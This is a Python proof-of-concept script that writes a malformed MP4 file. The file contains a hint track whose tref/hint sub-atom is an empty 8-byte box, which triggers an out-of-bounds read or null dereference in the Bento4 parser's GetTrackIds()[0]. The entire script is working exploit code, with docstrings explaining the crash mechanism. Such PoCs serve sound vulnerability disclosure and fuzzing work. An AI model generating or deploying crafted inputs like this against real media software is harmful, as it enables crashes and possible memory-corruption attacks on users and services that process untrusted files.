#!/usr/bin/env python3
"""
PoC generator for VULN 001: OOB Read on Empty AP4_Array in GetTrackIds()[0]
File: Ap4HintTrackReader.cpp line 66
CWE: CWE-125 (Out-of-bounds Read)

Trigger: tref/hint atom with size=8 (just the 8-byte box header, no payload).
When AP4_TrefTypeAtom parses this, data_size = 8 - 8 = 0, so m_TrackIds
remains empty (m_Items is NULL). Then GetTrackIds()[0] dereferences NULL.
"""

import struct
import os
import sys

POC_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(POC_DIR, "vuln_001.mp4")


def make_box(type4, payload=b''):
    """Build a standard MP4 box: size(4B BE) + type(4B) + payload."""
    assert len(type4) == 4, f"Box type must be 4 chars, got {type4!r}"
    size = 8 + len(payload)
    return struct.pack('>I', size) + type4.encode('latin-1') + payload


def make_fullbox(type4, version=0, flags=0, payload=b''):
    """Build a FullBox: box header + version(1B) + flags(3B) + payload."""
    vf = struct.pack('>I', ((version & 0xFF) << 24) | (flags & 0x00FFFFFF))
    return make_box(type4, vf + payload)


# ---------------------------------------------------------------------------
# Identity matrix for tkhd / mvhd (9 x 4 bytes, fixed-point 16.16 / 2.30)
# [1.0, 0,   0  ]
# [0,   1.0, 0  ]
# [0,   0,   16384.0]  (= 0x40000000 in 2.30 fixed-point)
# ---------------------------------------------------------------------------
IDENTITY_MATRIX = struct.pack('>9I',
    0x00010000, 0x00000000, 0x00000000,
    0x00000000, 0x00010000, 0x00000000,
    0x00000000, 0x00000000, 0x40000000,
)


def make_ftyp():
    """ftyp: major_brand='isom', minor_version=0, compat='isom'"""
    payload = b'isom'                    # major_brand
    payload += struct.pack('>I', 0)      # minor_version
    payload += b'isom'                   # compatible_brands[0]
    return make_box('ftyp', payload)


def make_mvhd(timescale=1000, duration=0, next_track_id=3):
    """mvhd box (version 0)."""
    payload = struct.pack('>II', 0, 0)          # creation_time, modification_time
    payload += struct.pack('>II', timescale, duration)
    payload += struct.pack('>I', 0x00010000)    # rate = 1.0
    payload += struct.pack('>H', 0x0100)        # volume = 1.0
    payload += b'\x00' * 10                    # reserved (2B + 8B)
    payload += IDENTITY_MATRIX                  # 36 bytes
    payload += b'\x00' * 24                    # pre_defined (6 x 4B)
    payload += struct.pack('>I', next_track_id)
    return make_fullbox('mvhd', 0, 0, payload)


def make_tkhd(track_id, duration=0, width=0, height=0, volume=0, flags=3):
    """tkhd box (version 0). flags=3 means enabled + in-movie."""
    payload = struct.pack('>II', 0, 0)          # creation_time, modification_time
    payload += struct.pack('>I', track_id)
    payload += struct.pack('>I', 0)             # reserved
    payload += struct.pack('>I', duration)
    payload += b'\x00' * 8                     # reserved2
    payload += struct.pack('>hH', 0, 0)        # layer, alternate_group
    payload += struct.pack('>H', volume)        # volume
    payload += struct.pack('>H', 0)            # reserved3
    payload += IDENTITY_MATRIX
    payload += struct.pack('>II', width, height)
    return make_fullbox('tkhd', 0, flags, payload)


def make_mdhd(timescale=1000, duration=0):
    """mdhd box (version 0)."""
    payload = struct.pack('>II', 0, 0)          # creation_time, modification_time
    payload += struct.pack('>II', timescale, duration)
    payload += struct.pack('>HH', 0x55C4, 0)   # language='und', pre_defined
    return make_fullbox('mdhd', 0, 0, payload)


def make_hdlr(handler_type):
    """hdlr box. handler_type is a 4-char string like 'hint' or 'soun'."""
    payload = struct.pack('>I', 0)              # pre_defined
    payload += handler_type.encode('latin-1')   # handler_type (4B)
    payload += b'\x00' * 12                    # reserved
    payload += b'\x00'                         # name (empty, null-terminated)
    return make_fullbox('hdlr', 0, 0, payload)


def make_url_entry():
    """A self-contained URL entry for dref (flags=1 = self-reference)."""
    return make_fullbox('url ', 0, 1)


def make_dinf():
    """dinf box containing a single self-contained dref entry."""
    url_entry = make_url_entry()
    dref_payload = struct.pack('>I', 1) + url_entry   # entry_count=1
    dref = make_fullbox('dref', 0, 0, dref_payload)
    return make_box('dinf', dref)


def make_stbl():
    """Minimal stbl with all empty tables (no samples)."""
    stsd = make_fullbox('stsd', 0, 0, struct.pack('>I', 0))    # entry_count=0
    stts = make_fullbox('stts', 0, 0, struct.pack('>I', 0))    # entry_count=0
    stsc = make_fullbox('stsc', 0, 0, struct.pack('>I', 0))    # entry_count=0
    # stsz: sample_size=0 (variable), sample_count=0
    stsz = make_fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))
    stco = make_fullbox('stco', 0, 0, struct.pack('>I', 0))    # entry_count=0
    return make_box('stbl', stsd + stts + stsc + stsz + stco)


def make_nmhd():
    """Null media header (used for hint tracks)."""
    return make_fullbox('nmhd', 0, 0)


def make_smhd():
    """Sound media header."""
    payload = struct.pack('>HH', 0, 0)   # balance=0, reserved=0
    return make_fullbox('smhd', 0, 0, payload)


def make_hint_minf():
    """minf for a hint track: nmhd + dinf + stbl."""
    return make_box('minf', make_nmhd() + make_dinf() + make_stbl())


def make_audio_minf():
    """minf for an audio track: smhd + dinf + stbl."""
    return make_box('minf', make_smhd() + make_dinf() + make_stbl())


def make_tref_hint_empty():
    """
    THE KEY BOX: tref containing a 'hint' tref-type sub-atom with size=8.

    size=8 means the hint sub-atom has NO payload (no 4-byte track IDs).
    When AP4_TrefTypeAtom parses this:
        data_size = 8 - 8 = 0
        while (data_size >= 4) { ... }  // never executes
    So m_TrackIds is empty. Then GetTrackIds()[0] reads m_Items[0]
    where m_Items is NULL → OOB / null-dereference.
    """
    # Build the 'hint' tref-type sub-atom: 4B size + 4B type, NO track IDs
    hint_subatom = struct.pack('>I', 8) + b'hint'   # size=8, type='hint'
    # Wrap in tref container
    return make_box('tref', hint_subatom)


def make_hint_track(track_id=1):
    """
    A hint track (trak) containing:
      tkhd + mdia(mdhd + hdlr('hint') + minf) + tref(hint@size=8)
    """
    tkhd = make_tkhd(track_id, duration=0, width=0, height=0, volume=0, flags=3)
    mdhd = make_mdhd(timescale=1000, duration=0)
    hdlr = make_hdlr('hint')
    minf = make_hint_minf()
    mdia = make_box('mdia', mdhd + hdlr + minf)
    tref = make_tref_hint_empty()   # <-- the malicious tref
    return make_box('trak', tkhd + mdia + tref)


def make_audio_track(track_id=2):
    """
    A minimal audio track (trak) so mp42aac has an audio track to process.
    """
    tkhd = make_tkhd(track_id, duration=0, width=0, height=0,
                     volume=0x0100, flags=3)
    mdhd = make_mdhd(timescale=44100, duration=0)
    hdlr = make_hdlr('soun')
    minf = make_audio_minf()
    mdia = make_box('mdia', mdhd + hdlr + minf)
    return make_box('trak', tkhd + mdia)


def build_mp4():
    ftyp = make_ftyp()
    mvhd = make_mvhd(timescale=1000, duration=0, next_track_id=3)
    hint_trak = make_hint_track(track_id=1)
    audio_trak = make_audio_track(track_id=2)
    moov = make_box('moov', mvhd + hint_trak + audio_trak)
    return ftyp + moov


if __name__ == '__main__':
    data = build_mp4()
    with open(OUT_FILE, 'wb') as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {OUT_FILE}")
    print(f"[+] tref/hint sub-atom has size=8 (no track IDs) -- triggers OOB in GetTrackIds()[0]")
